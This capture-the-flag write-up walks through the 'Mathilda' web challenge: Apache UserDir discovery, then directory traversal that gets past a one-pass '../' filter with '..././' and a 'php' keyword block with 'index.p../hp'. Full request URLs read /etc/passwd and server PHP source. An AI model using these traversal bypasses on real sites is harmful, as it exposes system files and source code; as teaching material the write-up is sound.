# Mathilda - Web - 57 points - 96 solvers

> Mathilda learned many skills from Leon, now she want to use [them](http://178.62.48.181/)!

Visiting the page in the description gives us a simple static page. Hidden in the source is the comment `<!-- created by ~rooney -->`. So we go to `http://178.62.48.181/~rooney/`. The tilde syntax enables Apache's [UserDir](https://httpd.apache.org/docs/2.4/howto/public_html.html) module, allowing each user on a system to have their own public directory without any user specific configuration. In this case the files are actually located in `/home/rooney/public_html/`

On the new page, there's a link to `http://178.62.48.181/~rooney/?path=rooney`, and this looks suspiciously like a directory traversal challenge. But simply going to `http://178.62.48.181/~rooney/?path=../../../../../../../../../etc/passwd` doesn't work. After a bit experimentation, we find that `../` is replaced before the path is accessed. But the replacement is only done once, so if we use something like `..././` it will be transformed to `../`. So we can visit `http://178.62.48.181/~rooney/?path=..././..././..././..././etc/passwd` and it works:

    'rooney:x:1000:1000:,,,:/home/rooney:/bin/false'
    'th1sizveryl0ngus3rn4me:x:1001:1001:,,,:/home/th1sizveryl0ngus3rn4me:/bin/bash'
    
That is a very suspicious username. Since UserDir is enabled, we try to visit `http://178.62.48.181/~th1sizveryl0ngus3rn4me/` and we get a mysterious "Invalid Device" message. We try to look at the source instead by visiting `http://178.62.48.181/~rooney/?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/index.php` but this gives a `Security failed!` message? Seems like it filters out `php` from the path parameter, but we can bypass this by visiting `http://178.62.48.181/~rooney/?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/index.p../hp` instead. `index.php` requires `flag.php` so we do the same and visit `http://178.62.48.181/~rooney/?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/flag.p../hp` and get the flag `ASIS{I_l0V3_Us3rD1r_Mpdul3!!}`
